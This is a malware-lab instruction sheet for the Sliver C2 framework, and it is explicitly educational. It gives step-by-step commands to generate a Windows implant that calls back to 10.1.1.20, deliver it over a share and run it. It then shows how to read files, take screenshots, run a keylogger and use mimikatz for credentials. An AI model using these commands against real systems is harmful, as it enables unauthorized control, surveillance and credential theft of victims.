> **Disclaimer:** The purpose of the lab environment is solely for educational and research purposes within the context of authorized and supervised activities. This lab environment is established to facilitate learning, analysis, and understanding of malware and related cybersecurity concepts. The malware lab environment is equipped with security measures to prevent unauthorized access and the spread of malware. However, it is essential to exercise caution and follow established protocols to minimize the risk of accidental exposure, infection, or unintended distribution of malware.

# Sliver C2 Botnet Instructions
Sliver is an open-source command and control (C2) botnet framework designed for educational purposes. The framework consists of a main server component that allows the deployment and management of botnet infrastructure. The server facilitates communication with the botnets.

C2 infrastructure operates by establishing a connection from the victim's machine back to the controller using outbound communication through well-known ports, such as HTTP. Typically, firewalls block incoming communication, but outbound communication through HTTP is commonly allowed. C2 botnet infrastructure exploits this by having the Sliver server listen for incoming communication from the botnet victims.

When a victim's machine is compromised and becomes part of the botnet, it runs with user privileges. This allows the controller to issue various commands to the botnet, essentially giving the controller control over the actions the victim machine performs. Consequently, the controller can carry out malicious activities using the compromised machines.

Please note that in your lab environment, all protection measures are disabled. However, in a real-world scenario, botnets can be thwarted by using up-to-date anti-malware software to prevent the initial implant from executing. If the initial infection occurs, it becomes more challenging to detect and stop the botnet's C2 communication, as the botnet attempts to camouflage itself as regular network traffic.

It is crucial to conduct these experiments and study the botnet framework within a controlled and strictly educational environment. The knowledge gained can contribute to understanding botnet behaviors, detecting and mitigating potential threats, and reinforcing cybersecurity practices.

## Accessing your Servers
You have 2 servers in your lab:
* **sliver-server**: Ubuntu server with the role of command and control of the botnet.
* **sliver-victim**: A test victim server used for installing implants.

> **Information:** When connecting to servers, it may be best to open this in an incognito browser to avoid caching the credentials used to connect. Only connect to one of the servers at a time, and then, only in incognito mode.

![image](https://github.com/emerginganalytics/cyberarena/assets/50710945/4b1ffb77-62f5-4208-89e7-fd88ef5be39c)

### Start and Run Sliver
Open the Sliver server interface, which will be an SSH command prompt. Run the following commands to start Sliver. If promted for the sudo password, enter in `Let's workout!`
```
sudo systemctl start sliver
sudo sliver
```
You should then see a prompt similar to the one below:
![image](https://github.com/emerginganalytics/cyberarena/assets/50633591/4e87efc9-669f-4d72-b099-308bf03cd49b)

### Generating the Implant
Run the following command to generate the botnet malware. This will take a few minutes and when it completes a new executable with an arbitrary name will be saved in the student directory indicated.
```
generate --mtls 10.1.1.20 --os windows --arch amd64 --format exe
```
When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exist the sliver prompt by typing in `exit`.
```
cp ./<RANDOM_NAME>.exe /srv/sliver/
sudo chmod 777 /srv/sliver/<RANDOM_NAME>.exe
```
The `cp` command means copy and it copies the executable you just created to a directory /srv/sliver. For the nerds out there, a SAMBA server is running on the Ubuntu system that allows Windows systems to navigate to the executable using network shares.

Now you'll want to start the Botnet server so it will listen for the victim to communicate back to it. Run the following:
```
sudo sliver
sliver > mtls
```
Sliver is now waiting for clients to communicate back with it.

### Open your Victim Machine
Then, the malware can be accessed by your Windows server, sliver-victim, by opening a file explorer and navigating to `\\10.1.1.20\sliver`

Double click to run the executable. Nothing will happen, but the C2 backchannel communication will be established.

### Use Botnet Server
Go to the sliver-server and you should see a line like this:
```
[*] Session 40ecf1dd ...
```
This lets you know that a C2 channel is open to the victim. You can use this channel by typing:
```
use 1 (replace '1' with the first character of your session ID)
```
You can also list the sessions by typing `sessions` and find the session ID of the victim PC.

You can run commands similar to the following:
```
sliver (RANDOM_NAME) > info             # This will show you information about the remote PC
sliver (RANDOM_NAME) > execute calc     # Open the calculator application on the desktop
sliver (RANDOM_NAME) > execute notepad  # Open the notepad application on the desktop
```
Some other interesting commands:
```
sliver (RANDOM_NAME) > cat /users/cyberarena/sample.txt   # dumps the contents of a text file
sliver (RANDOM_NAME) > screenshot                         # Generate a current screenshot. You can move this to the /srv/sliver directory to view it
```

### Sliver Armory
The Sliver armory 
```
sudo sliver                               # If you're not already in the console.
sliver > armory install raw-keylogger     # Install a keylogger extension
sliver > user 1                           # Replace with the session ID
sliver (RANDOM_NAME) > raw-keylogger 1    # Starts the remote keylogger. You can go to the victim machine and type into a notepad.
sliver (RANDOM_NAME) > raw-keylogger 2    # Captures the keylogger output.
```
> **Challenge:** There's a secret password on the victim. See if you can use mimikatz through the Armory to recover the password.

### Sliver Network Communication Monitoring
You can observe the network traffic used by Sliver through the Wireshark application on the Windows victim desktop. Double click on Wireshark and include the filter `host 10.1.1.20` similar to the screenshot below, but make sure to use the IP address 10.1.1.20.
![image](https://github.com/emerginganalytics/cyberarena/assets/50633591/88443e75-ad85-402d-9bf3-19df26b92fe0)

You will start to see traffic coming across periodically. Here, you can observe the protocol used by Sliver.
